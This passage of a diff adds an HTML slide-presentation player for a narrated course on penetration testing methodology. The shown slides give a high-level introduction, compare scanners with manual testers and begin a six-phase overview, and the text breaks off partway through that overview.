@@ -1,0 +1,1521 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Penetration Testing Methodology — Video Course</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --bg: #06050e;
+            --sf: #0c0a1a;
+            --cd: #141028;
+            --bd: #26204a;
+            --fg: #e4e0f8;
+            --mt: #6a62a0;
+            --ac: #B388FF;
+            --ac2: #FF6E40;
+            --acg: rgba(179, 136, 255, .07);
+            --sv: #B0BEC5;
+            --gn: #69F0AE;
+            --gng: rgba(105, 240, 174, .08);
+            --cy: #18FFFF;
+            --cug: rgba(24, 255, 255, .07);
+            --amb: #FFD740;
+            --amg: rgba(255, 215, 64, .07);
+            --pp: #EA80FC;
+            --ppg: rgba(234, 128, 252, .05);
+            --rd: #FF5252
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        html,
+        body {
+            height: 100%;
+            overflow: hidden;
+            background: var(--bg);
+            color: var(--fg);
+            font-family: 'Space Grotesk', sans-serif
+        }
+
+        .bgl {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none
+        }
+
+        .bggrid {
+            background-image: linear-gradient(rgba(179, 136, 255, .01) 1px, transparent 1px), linear-gradient(90deg, rgba(179, 136, 255, .01) 1px, transparent 1px);
+            background-size: 48px 48px
+        }
+
+        .bg1 {
+            width: 600px;
+            height: 600px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(179, 136, 255, .04) 0%, transparent 70%);
+            position: absolute;
+            top: -200px;
+            right: -100px;
+            animation: g1 26s ease-in-out infinite
+        }
+
+        .bg2 {
+            width: 450px;
+            height: 450px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255, 112, 67, .025) 0%, transparent 70%);
+            position: absolute;
+            bottom: -150px;
+            left: -80px;
+            animation: g2 30s ease-in-out infinite
+        }
+
+        .bg3 {
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(176, 190, 197, .02) 0%, transparent 70%);
+            position: absolute;
+            top: 50%;
+            left: 20%;
+            animation: g3 22s ease-in-out infinite
+        }
+
+        @keyframes g1 {
+
+            0%,
+            100% {
+                transform: translate(0, 0)
+            }
+
+            50% {
+                transform: translate(-80px, 60px)
+            }
+        }
+
+        @keyframes g2 {
+
+            0%,
+            100% {
+                transform: translate(0, 0)
+            }
+
+            50% {
+                transform: translate(50px, -40px)
+            }
+        }
+
+        @keyframes g3 {
+
+            0%,
+            100% {
+                transform: translate(0, 0)
+            }
+
+            50% {
+                transform: translate(-30px, 20px)
+            }
+        }
+
+        #app {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            height: 100vh
+        }
+
+        .tbar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 16px;
+            background: rgba(12, 10, 26, .9);
+            backdrop-filter: blur(14px);
+            border-bottom: 1px solid var(--bd);
+            flex-shrink: 0
+        }
+
+        .tbar .lo {
+            color: var(--ac);
+            font-weight: 700;
+            font-size: 12px;
+            letter-spacing: .5px;
+            font-family: 'Fira Code', monospace
+        }
+
+        .tbar .ti {
+            color: var(--mt);
+            font-size: 11px;
+            flex: 1;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis
+        }
+
+        .tb {
+            background: none;
+            border: 1px solid var(--bd);
+            color: var(--mt);
+            padding: 4px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 11px;
+            font-family: inherit;
+            transition: all .2s
+        }
+
+        .tb:hover {
+            border-color: var(--ac);
+            color: var(--ac)
+        }
+
+        .tb.on {
+            border-color: var(--ac);
+            color: var(--ac);
+            background: var(--acg)
+        }
+
+        .ma {
+            flex: 1;
+            display: flex;
+            overflow: hidden;
+            position: relative
+        }
+
+        .cp {
+            width: 270px;
+            background: rgba(12, 10, 26, .93);
+            backdrop-filter: blur(14px);
+            border-right: 1px solid var(--bd);
+            overflow-y: auto;
+            flex-shrink: 0;
+            transform: translateX(-100%);
+            transition: transform .3s ease;
+            position: absolute;
+            z-index: 10;
+            height: 100%
+        }
+
+        .cp.op {
+            transform: translateX(0)
+        }
+
+        .cp::-webkit-scrollbar {
+            width: 3px
+        }
+
+        .cp::-webkit-scrollbar-thumb {
+            background: var(--bd);
+            border-radius: 3px
+        }
+
+        .ch {
+            padding: 12px 14px;
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--mt);
+            border-bottom: 1px solid var(--bd);
+            font-weight: 600
+        }
+
+        .ci {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 7px 14px;
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            transition: all .2s;
+            font-size: 10px;
+            color: var(--mt);
+            line-height: 1.35
+        }
+
+        .ci:hover {
+            background: rgba(229, 57, 53, .03);
+            color: var(--fg)
+        }
+
+        .ci.on {
+            border-left-color: var(--ac);
+            color: var(--ac);
+            background: var(--acg)
+        }
+
+        .ci .nm {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 8px;
+            font-weight: 600;
+            border: 1px solid var(--bd);
+            flex-shrink: 0;
+            font-family: 'Fira Code', monospace
+        }
+
+        .ci.on .nm {
+            border-color: var(--ac);
+            background: var(--acg)
+        }
+
+        .pw {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            min-width: 0
+        }
+
+        .pl {
+            width: 100%;
+            max-width: 1100px;
+            aspect-ratio: 16/9;
+            background: var(--sf);
+            border-radius: 11px;
+            overflow: hidden;
+            border: 1px solid var(--bd);
+            box-shadow: 0 0 60px rgba(229, 57, 53, .02), 0 18px 50px rgba(0, 0, 0, .5);
+            display: flex;
+            flex-direction: column;
+            position: relative
+        }
+
+        .pl::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            z-index: 5;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(229, 57, 53, .004) 2px, rgba(229, 57, 53, .004) 4px)
+        }
+
+        .sa {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column
+        }
+
+        .sl {
+            position: absolute;
+            inset: 0;
+            padding: 28px 36px;
+            display: flex;
+            flex-direction: column;
+            opacity: 0;
+            transform: translateX(26px);
+            transition: opacity .4s ease, transform .4s ease;
+            overflow-y: auto;
+            z-index: 1
+        }
+
+        .sl.on {
+            opacity: 1;
+            transform: translateX(0);
+            z-index: 2
+        }
+
+        .sl.ex {
+            opacity: 0;
+            transform: translateX(-26px);
+            z-index: 1
+        }
+
+        .sl::-webkit-scrollbar {
+            width: 3px
+        }
+
+        .sl::-webkit-scrollbar-thumb {
+            background: var(--bd);
+            border-radius: 3px
+        }
+
+        .slb {
+            font-family: 'Fira Code', monospace;
+            font-size: 9px;
+            color: var(--ac);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+            flex-shrink: 0
+        }
+
+        .slt {
+            font-size: clamp(16px, 2.5vw, 26px);
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 12px;
+            flex-shrink: 0;
+            background: linear-gradient(135deg, var(--fg) 0%, var(--mt) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent
+        }
+
+        .sbd {
+            flex: 1;
+            overflow-y: auto;
+            padding-right: 4px
+        }
+
+        .sbd::-webkit-scrollbar {
+            width: 3px
+        }
+
+        .sbd::-webkit-scrollbar-thumb {
+            background: var(--bd);
+            border-radius: 3px
+        }
+
+        .bl {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 7px
+        }
+
+        .bl li {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            font-size: clamp(10px, 1.3vw, 13px);
+            line-height: 1.55;
+            color: rgba(236, 232, 240, .86);
+            opacity: 0;
+            transform: translateY(6px);
+            animation: bi .36s ease forwards
+        }
+
+        .bl li .d {
+            width: 5px;
+            height: 5px;
+            border-radius: 50%;
+            background: var(--ac);
+            flex-shrink: 0;
+            margin-top: 6px
+        }
+
+        @keyframes bi {
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
+
+        .tbl {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: clamp(8px, 1.05vw, 11px)
+        }
+
+        .tbl thead th {
+            text-align: left;
+            padding: 5px 8px;
+            border-bottom: 2px solid var(--ac);
+            color: var(--ac);
+            font-weight: 600;
+            font-family: 'Fira Code', monospace;
+            font-size: clamp(7px, .95vw, 9px);
+            text-transform: uppercase;
+            letter-spacing: .3px
+        }
+
+        .tbl tbody td {
+            padding: 4px 8px;
+            border-bottom: 1px solid var(--bd);
+            color: rgba(236, 232, 240, .78);
+            vertical-align: top
+        }
+
+        .tbl tbody tr:hover {
+            background: rgba(229, 57, 53, .02)
+        }
+
+        .code {
+            background: #0a0810;
+            border: 1px solid var(--bd);
+            border-radius: 6px;
+            padding: 10px 14px;
+            font-family: 'Fira Code', monospace;
+            font-size: clamp(8px, 1.05vw, 11px);
+            line-height: 1.7;
+            overflow-x: auto
+        }
+
+        .code .kw {
+            color: var(--pp)
+        }
+
+        .code .fn {
+            color: var(--cy)
+        }
+
+        .code .sr {
+            color: var(--gn)
+        }
+
+        .code .nm {
+            color: var(--amb)
+        }
+
+        .code .cm {
+            color: var(--mt);
+            font-style: italic
+        }
+
+        .code .op {
+            color: var(--ac)
+        }
+
+        .tc2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px
+        }
+
+        .cd {
+            background: var(--cd);
+            border: 1px solid var(--bd);
+            border-radius: 8px;
+            padding: 11px;
+            border-top: 3px solid
+        }
+
+        .cd h4 {
+            font-size: clamp(10px, 1.2vw, 13px);
+            font-weight: 600;
+            margin-bottom: 6px
+        }
+
+        .wb {
+            background: rgba(229, 57, 53, .05);
+            border: 1px solid rgba(229, 57, 53, .12);
+            border-radius: 6px;
+            padding: 8px 11px;
+            font-size: 10px;
+            color: var(--ac);
+            display: flex;
+            align-items: flex-start;
+            gap: 6px;
+            margin-top: 8px
+        }
+
+        .ib {
+            background: var(--cug);
+            border: 1px solid rgba(38, 198, 218, .1);
+            border-radius: 6px;
+            padding: 8px 11px;
+            font-size: 10px;
+            color: var(--cy);
+            display: flex;
+            align-items: flex-start;
+            gap: 6px;
+            margin-top: 8px
+        }
+
+        .fb {
+            background: var(--gng);
+            border: 1px solid rgba(0, 230, 118, .1);
+            border-radius: 6px;
+            padding: 8px 11px;
+            font-size: 10px;
+            color: var(--gn);
+            display: flex;
+            align-items: flex-start;
+            gap: 6px;
+            margin-top: 8px
+        }
+
+        .ab {
+            background: var(--amg);
+            border: 1px solid rgba(255, 193, 7, .1);
+            border-radius: 6px;
+            padding: 8px 11px;
+            font-size: 10px;
+            color: var(--amb);
+            display: flex;
+            align-items: flex-start;
+            gap: 6px;
+            margin-top: 8px
+        }
+
+        .pgb {
+            background: var(--ppg);
+            border: 1px solid rgba(206, 147, 216, .1);
+            border-radius: 6px;
+            padding: 8px 11px;
+            font-size: 10px;
+            color: var(--pp);
+            display: flex;
+            align-items: flex-start;
+            gap: 6px;
+            margin-top: 8px
+        }
+
+        .ts {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            height: 100%
+        }
+
+        .ts .mt {
+            font-size: clamp(18px, 3vw, 38px);
+            font-weight: 800;
+            line-height: 1.12;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, var(--ac) 0%, var(--ac2) 40%, var(--sv) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent
+        }
+
+        .ts .ms {
+            color: var(--mt);
+            font-size: clamp(9px, 1.2vw, 14px);
+            max-width: 500px;
+            line-height: 1.5
+        }
+
+        .ts .ht {
+            margin-top: 24px;
+            color: var(--ac);
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            animation: pu 2s ease-in-out infinite
+        }
+
+        @keyframes pu {
+
+            0%,
+            100% {
+                opacity: .3
+            }
+
+            50% {
+                opacity: 1
+            }
+        }
+
+        .phase-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 6px 10px;
+            border-radius: 6px;
+            border-left: 3px solid;
+            transition: all .2s
+        }
+
+        .phase-row:hover {
+            transform: translateX(3px)
+        }
+
+        .phase-num {
+            width: 28px;
+            height: 28px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            font-weight: 700;
+            flex-shrink: 0
+        }
+
+        .phase-body {
+            flex: 1
+        }
+
+        .phase-name {
+            font-weight: 600;
+            font-size: clamp(10px, 1.2vw, 13px)
+        }
+
+        .phase-desc {
+            color: var(--mt);
+            font-size: clamp(8px, 1vw, 10px);
+            margin-top: 1px
+        }
+
+        .phase-pct {
+            font-family: 'Fira Code', monospace;
+            font-size: 10px;
+            font-weight: 600;
+            flex-shrink: 0
+        }
+
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+            gap: 6px
+        }
+
+        .tool-card {
+            background: var(--cd);
+            border: 1px solid var(--bd);
+            border-radius: 6px;
+            padding: 8px 10px;
+            text-align: center;
+            transition: all .2s;
+            border-bottom: 2px solid transparent
+        }
+
+        .tool-card:hover {
+            border-bottom-color: var(--ac);
+            background: var(--acg)
+        }
+
+        .tool-card .tn {
+            font-family: 'Fira Code', monospace;
+            font-size: clamp(9px, 1.1vw, 11px);
+            font-weight: 600;
+            color: var(--fg)
+        }
+
+        .tool-card .tp {
+            font-size: clamp(7px, .9vw, 9px);
+            color: var(--mt);
+            margin-top: 2px
+        }
+
+        .kill-chain {
+            display: flex;
+            flex-direction: column;
+            gap: 3px
+        }
+
+        .kc-step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 5px 10px;
+            background: var(--cd);
+            border: 1px solid var(--bd);
+            border-radius: 6px;
+            font-size: clamp(8px, 1vw, 11px)
+        }
+
+        .kc-arrow {
+            display: flex;
+            justify-content: center;
+            color: var(--ac);
+            font-size: 12px
+        }
+
+        .si2 {
+            position: absolute;
+            bottom: 8px;
+            right: 12px;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: 8px;
+            color: var(--ac);
+            opacity: 0;
+            transition: opacity .3s
+        }
+
+        .si2.vis {
+            opacity: 1
+        }
+
+        .sbs {
+            display: flex;
+            gap: 1px;
+            align-items: end;
+            height: 10px
+        }
+
+        .sb2 {
+            width: 2px;
+            background: var(--ac);
+            border-radius: 1px;
+            animation: sba .45s ease-in-out infinite
+        }
+
+        .sb2:nth-child(1) {
+            height: 3px;
+            animation-delay: 0s
+        }
+
+        .sb2:nth-child(2) {
+            height: 7px;
+            animation-delay: .1s
+        }
+
+        .sb2:nth-child(3) {
+            height: 10px;
+            animation-delay: .2s
+        }
+
+        .sb2:nth-child(4) {
+            height: 5px;
+            animation-delay: .07s
+        }
+
+        @keyframes sba {
+
+            0%,
+            100% {
+                transform: scaleY(.3)
+            }
+
+            50% {
+                transform: scaleY(1)
+            }
+        }
+
+        .ct {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 5px 10px;
+            background: rgba(8, 6, 10, .95);
+            border-top: 1px solid var(--bd);
+            flex-shrink: 0;
+            position: relative;
+            z-index: 10
+        }
+
+        .ctb {
+            background: none;
+            border: none;
+            color: var(--mt);
+            cursor: pointer;
+            font-size: 11px;
+            width: 26px;
+            height: 26px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            transition: all .15s
+        }
+
+        .ctb:hover {
+            color: var(--fg);
+            background: rgba(255, 255, 255, .04)
+        }
+
+        .ctb.pb {
+            font-size: 13px;
+            color: var(--ac)
+        }
+
+        .pw3 {
+            flex: 1;
+            height: 4px;
+            background: var(--bd);
+            border-radius: 2px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            min-width: 40px
+        }
+
+        .pf2 {
+            height: 100%;
+            background: linear-gradient(90deg, #b71c1c, var(--ac));
+            border-radius: 2px;
+            transition: width .3s linear;
+            position: relative
+        }
+
+        .pf2::after {
+            content: '';
+            position: absolute;
+            right: -4px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 9px;
+            height: 9px;
+            border-radius: 50%;
+            background: var(--ac);
+            opacity: 0;
+            transition: opacity .2s;
+            box-shadow: 0 0 6px var(--ac)
+        }
+
+        .pw3:hover .pf2::after {
+            opacity: 1
+        }
+
+        .tdi {
+            font-family: 'Fira Code', monospace;
+            font-size: 8px;
+            color: var(--mt);
+            white-space: nowrap
+        }
+
+        .ss2 {
+            background: var(--cd);
+            border: 1px solid var(--bd);
+            color: var(--ac);
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: 'Fira Code', monospace;
+            font-size: 8px;
+            cursor: pointer;
+            outline: none
+        }
+
+        .ss2:focus {
+            border-color: var(--ac)
+        }
+
+        .vs2 {
+            display: flex;
+            align-items: center;
+            gap: 3px
+        }
+
+        .vsl2 {
+            width: 40px;
+            height: 3px;
+            -webkit-appearance: none;
+            appearance: none;
+            background: var(--bd);
+            border-radius: 2px;
+            outline: none;
+            cursor: pointer
+        }
+
+        .vsl2::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--ac);
+            cursor: pointer
+        }
+
+        .io2 {
+            position: absolute;
+            inset: 0;
+            z-index: 20;
+            background: var(--sf);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity .5s ease, visibility .5s
+        }
+
+        .io2.hid {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none
+        }
+
+        .io2 .ic {
+            font-size: 38px;
+            color: var(--ac);
+            margin-bottom: 14px
+        }
+
+        .io2 .it2 {
+            font-size: clamp(15px, 2.4vw, 30px);
+            font-weight: 700;
+            margin-bottom: 4px
+        }
+
+        .io2 .is2 {
+            color: var(--mt);
+            font-size: 11px;
+            margin-bottom: 22px;
+            text-align: center;
+            max-width: 460px;
+            line-height: 1.5
+        }
+
+        .sbt {
+            background: var(--ac);
+            color: #fff;
+            border: none;
+            padding: 9px 30px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all .2s;
+            box-shadow: 0 0 22px rgba(229, 57, 53, .2)
+        }
+
+        .sbt:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(229, 57, 53, .3)
+        }
+
+        .eo2 {
+            position: absolute;
+            inset: 0;
+            z-index: 20;
+            background: rgba(8, 6, 10, .93);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity .5s, visibility .5s
+        }
+
+        .eo2.vis {
+            opacity: 1;
+            visibility: visible
+        }
+
+        .eo2 .et2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--ac);
+            margin-bottom: 6px
+        }
+
+        .eo2 .es2 {
+            color: var(--mt);
+            margin-bottom: 18px;
+            font-size: 11px
+        }
+
+        .rbt {
+            background: none;
+            border: 2px solid var(--ac);
+            color: var(--ac);
+            padding: 7px 24px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all .2s
+        }
+
+        .rbt:hover {
+            background: var(--ac);
+            color: #fff
+        }
+
+        .tst2 {
+            position: fixed;
+            bottom: 60px;
+            left: 50%;
+            transform: translateX(-50%) translateY(12px);
+            background: var(--cd);
+            border: 1px solid var(--bd);
+            color: var(--fg);
+            padding: 6px 14px;
+            border-radius: 5px;
+            font-size: 10px;
+            z-index: 100;
+            opacity: 0;
+            transition: all .3s;
+            pointer-events: none;
+            box-shadow: 0 5px 18px rgba(0, 0, 0, .4)
+        }
+
+        .tst2.sh {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0)
+        }
+
+        .scope-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 5px 8px;
+            border-radius: 4px;
+            font-size: clamp(9px, 1.1vw, 11px);
+            border-bottom: 1px solid var(--bd)
+        }
+
+        .scope-item:last-child {
+            border-bottom: none
+        }
+
+        .scope-item i {
+            width: 14px;
+            text-align: center;
+            flex-shrink: 0
+        }
+
+        @media(max-width:768px) {
+            .pl {
+                border-radius: 7px;
+                aspect-ratio: auto;
+                height: calc(100vh - 80px)
+            }
+
+            .sl {
+                padding: 14px 16px
+            }
+
+            .tc2 {
+                grid-template-columns: 1fr
+            }
+
+            .tool-grid {
+                grid-template-columns: 1fr 1fr
+            }
+
+            .cp {
+                width: 220px
+            }
+
+            .tbar .ti {
+                display: none
+            }
+        }
+
+        @media(max-width:480px) {
+            .ct {
+                gap: 3px;
+                padding: 4px 5px
+            }
+
+            .ss2 {
+                display: none
+            }
+
+            .tool-grid {
+                grid-template-columns: 1fr 1fr
+            }
+        }
+
+        :focus-visible {
+            outline: 2px solid var(--ac);
+            outline-offset: 2px
+        }
+
+        @media(prefers-reduced-motion:reduce) {
+
+            *,
+            *::before,
+            *::after {
+                animation-duration: .01ms !important;
+                transition-duration: .01ms !important
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="bgl bggrid"></div>
+    <div class="bgl">
+        <div class="bg1"></div>
+        <div class="bg2"></div>
+        <div class="bg3"></div>
+    </div>
+    <div id="app">
+        <div class="tbar">
+            <button class="tb" id="ct2" aria-label="Chapters"><i class="fas fa-bars"></i> <span>Chapters</span></button>
+            <div class="lo">&gt;_ PENTEST_METHOD</div>
+            <div class="ti" id="ti2">The Penetration Testing Methodology</div>
+            <div style="width:16px"></div>
+        </div>
+        <div class="ma">
+            <nav class="cp" id="cp2" aria-label="Chapters">
+                <div class="ch">Chapters</div>
+                <div id="cl2"></div>
+            </nav>
+            <div class="pw">
+                <div class="pl" id="pl2">
+                    <div class="io2" id="io3">
+                        <div class="ic"><i class="fas fa-crosshairs"></i></div>
+                        <div class="it2">The Penetration Testing Methodology</div>
+                        <div class="is2">Reconnaissance &bull; Scanning &bull; Enumeration &bull; Exploitation &bull;
+                            Post-Exploitation &bull; Reporting</div>
+                        <button class="sbt" id="sbt2">Start Presentation</button>
+                        <div style="margin-top:10px;font-size:8px;color:var(--mt);font-family:'Fira Code',monospace">
+                            Browser TTS &bull; Headphones recommended</div>
+                    </div>
+                    <div class="eo2" id="eo3">
+                        <div class="et2">Presentation Complete</div>
+                        <div class="es2">You've covered the complete penetration testing methodology.</div>
+                        <button class="rbt" id="rbt2"><i class="fas fa-rotate-left"></i> Watch Again</button>
+                    </div>
+                    <div class="sa" id="sa2"></div>
+                    <div class="si2" id="si3">
+                        <div class="sbs">
+                            <div class="sb2"></div>
+                            <div class="sb2"></div>
+                            <div class="sb2"></div>
+                            <div class="sb2"></div>
+                        </div><span>NARRATING</span>
+                    </div>
+                    <div class="ct">
+                        <button class="ctb" id="pv2" aria-label="Previous"><i class="fas fa-backward-step"></i></button>
+                        <button class="ctb pb" id="pl3" aria-label="Play/Pause"><i class="fas fa-play"
+                                id="pli2"></i></button>
+                        <button class="ctb" id="nx2" aria-label="Next"><i class="fas fa-forward-step"></i></button>
+                        <div class="pw3" id="pw4" role="slider" aria-label="Progress" tabindex="0">
+                            <div class="pf2" id="pf3" style="width:0%"></div>
+                        </div>
+                        <div class="tdi" id="td2">00:00 / 00:00</div>
+                        <select class="ss2" id="ss3" aria-label="Speed">
+                            <option value="0.75">0.75x</option>
+                            <option value="1" selected>1.0x</option>
+                            <option value="1.25">1.25x</option>
+                            <option value="1.5">1.5x</option>
+                        </select>
+                        <div class="vs2">
+                            <button class="ctb" id="vb2" aria-label="Mute"><i class="fas fa-volume-high"
+                                    id="vi2"></i></button>
+                            <input type="range" class="vsl2" id="vs3" min="0" max="1" step="0.1" value="1"
+                                aria-label="Volume">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="tst2" id="tst3"></div>
+    <script>
+        const D = [
+            {
+                t: "The Penetration Testing Methodology", lb: "Introduction",
+                n: "The Penetration Testing Methodology. This voice-guided presentation covers the complete offensive security workflow from start to finish. We will explore the six critical phases of professional penetration testing, the tools used at each stage, the legal and ethical framework that governs all engagements, and how findings are transformed into actionable intelligence through professional reporting.",
+                h: `<div class="ts"><div class="mt">The Penetration Testing<br>Methodology</div><div class="ms">A Systematic Approach to Offensive Security — From Reconnaissance to Reporting</div><div class="ht"><i class="fas fa-play"></i>&ensp;Press play to begin narration</div></div>`
+            },
+
+            {
+                t: "What Is Penetration Testing?", lb: "Chapter 01",
+                n: "Penetration testing, commonly called pentesting, is an authorized simulated cyberattack against a computer system, network, or web application designed to evaluate the security posture of an organization. Unlike vulnerability scanning, which merely identifies potential weaknesses, penetration testing actively exploits those weaknesses to demonstrate real-world impact. It answers the critical question that scanners cannot: if an attacker found this vulnerability, what could they actually accomplish?",
+                h: `<ul class="bl">
+<li><div class="d"></div><span><strong style="color:var(--ac)">Authorized simulated attack</strong> against systems, networks, and applications</span></li>
+<li><div class="d"></div><span>Goes beyond identification — <strong style="color:var(--ac2)">actively exploits</strong> weaknesses to prove real-world impact</span></li>
+<li><div class="d"></div><span>Answers the question scanners cannot: <strong style="color:var(--sv)">"What could an attacker actually accomplish?"</strong></span></li>
+<li><div class="d"></div><span>Conducted under <strong style="color:var(--gn)">strict legal authorization</strong> with documented scope and rules of engagement</span></li>
+<li><div class="d"></div><span>Produces an <strong style="color:var(--cy)">actionable report</strong> with prioritized remediation guidance, not just a list of findings</span></li>
+</ul>
+<div class="ib"><i class="fas fa-info-circle"></i><span>A vulnerability scanner finds the unlocked door. A penetration tester walks through it, maps the interior, locates the valuables, and demonstrates exactly what was taken.</span></div>`},
+
+            {
+                t: "Scanner vs Pentester — The Critical Distinction", lb: "Chapter 02",
+                n: "Understanding the difference between automated scanning and manual penetration testing is fundamental. Scanners are fast and thorough at identifying known signatures, outdated software, and missing patches. However, they cannot understand business logic, chain multiple low-severity vulnerabilities into a high-impact exploit, or adapt to unique configurations. A pentester thinks like an attacker, combining creativity with technical skill to find what machines miss.",
+                h: `<div class="tc2">
+<div class="cd" style="border-color:var(--sv)"><h4 style="color:var(--sv)"><i class="fas fa-robot"></i> Automated Scanner</h4>
+<ul class="bl"><li><div class="d" style="background:var(--sv)"></div><span>Identifies known CVEs and signatures</span></li>
+<li><div class="d" style="background:var(--sv)"></div><span>Detects outdated software versions</span></li>
+<li><div class="d" style="background:var(--sv)"></div><span>Fast, broad, shallow coverage</span></li>
+<li><div class="d" style="background:var(--ac)"></div><span style="color:var(--ac)">Cannot understand business logic</span></li>
+<li><div class="d" style="background:var(--ac)"></div><span style="color:var(--ac)">Cannot chain vulnerabilities</span></li>
+<li><div class="d" style="background:var(--ac)"></div><span style="color:var(--ac)">High false-positive rate</span></li></ul></div>
+<div class="cd" style="border-color:var(--ac)"><h4 style="color:var(--ac)"><i class="fas fa-user-ninja"></i> Manual Pentester</h4>
+<ul class="bl"><li><div class="d"></div><span>Exploits findings to prove impact</span></li>
+<li><div class="d"></div><span>Chains low-severity bugs into critical exploits</span></li>
+<li><div class="d"></div><span>Adapts to unique, custom architectures</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span style="color:var(--gn)">Understands business logic flaws</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span style="color:var(--gn)">Creative, adaptive methodology</span></li>
+<li><div class="d" style="background:var(--gn)"></div><span style="color:var(--gn)">Contextual, zero false positives</span></li></ul></div>
+</div>`},
+
+            {
+                t: "The Six Phases of Penetration Testing", lb: "Chapter 03",
+                n: "Professional penetration testing follows a rigorous six-phase methodology that mirrors how real-world adversaries operate. Phase one is Reconnaissance, gathering intelligence about the target. Phase two is Scanning, identifying open ports, services, and vulnerabilities. Phase three is Enumeration, extracting detailed information from discovered services. Phase four is Exploitation, actively attacking the target to gain access. Phase five is Post-Exploitation, maintaining access and escalating privileges. Phase six is Reporting, documenting everything for the client.",
+                h: `<div style="display:flex;flex-direction:column;gap:4px">
+<div class="phase-row" style="border-color:var(--ac);background:rgba(229,57,53,.04)"><div class="phase-num" style="background:rgba(229,57,53,.12);color:var(--ac)">01</div><div class="phase-body"><div class="phase-name" style="color:var(--ac)">Reconnaissance</div><div class="phase-desc">Passive and active intelligence gathering on the target organization</div></div><div class="phase-pct" style="color:var(--mt)">~25%</div></div>
+<div class="phase-row" style="border-color:var(--ac2);background:rgba(255,112,67,.03)"><div class="phase-num" style="background:rgba(255,112,67,.1);color:var(--ac2)">02</div><div class="phase-body"><div class="phase-name" style="color:var(--ac2)">Scanning</div><div class="phase-desc">Identifying open ports, running services, and vulnerability signatures</div></div><div class="phase-pct" style="color:var(--mt)">~15%</div></div>
+<div class="phase-row" style="border-color:var(--amb);background:var(--amg)"><div class="phase-num" style="background:var(--amg);color:var(--amb)">03</div><div class="phase-body"><div class="phase-name" style="color:var(--amb)">Enumeration</div><div class="phase-desc">Extracting usernames, shares, configs, and detailed service data</div></div><div class="phase-pct" style="color:var(--mt)">~15%</div></div>
